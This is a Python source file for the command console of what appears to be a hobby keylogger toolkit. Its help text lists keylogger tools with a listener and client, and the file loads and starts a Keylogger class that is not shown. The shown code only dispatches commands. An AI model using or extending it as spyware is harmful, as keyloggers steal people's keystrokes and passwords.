import logger

# TODO separate the handler's args from the keylogger args
# 1. Imlement OS commands/ shell module

class Handler:
    def __init__(self, args):
        self.args = args
        self.module = ""
        self.logger = None

    def start(self):
        while True:
            command = str(input(f"{self.module} >> "))
            self.handle_command(command)

    # bad code :)
    def handle_command(self, command):
        if command[0:3] == "USE" or command[0:3] == "use":
            self.module = command[4:]
            return

        if command == "help":
            self.print_help()
            return

        if self.module == "logger":
            if self.logger is None:
                self.logger = logger.Keylogger(self.args)
            if command == "start" or command == "run":
                self.logger.start()

        if command == "options":
            if self.module == "":
                print("No module selected")
                return
            cmd_array = command.split(' ')
            if len(cmd_array) > 1 and cmd_array[1] == "set":
                self.logger.update_options(cmd_array[2], cmd_array[3])
            else:
                self.logger.print_options()
            return

    def print_help(self):
        help_payload = ""
        help_payload += """
    help            - Displays this message
    USE <module>    - Select the module to use

    Modules
        logger      - keylogger tools, listener and client
            start   - Starts the keylogger module
            options - view and edit the current options
                options set <option> <value>
        """

        print(help_payload)
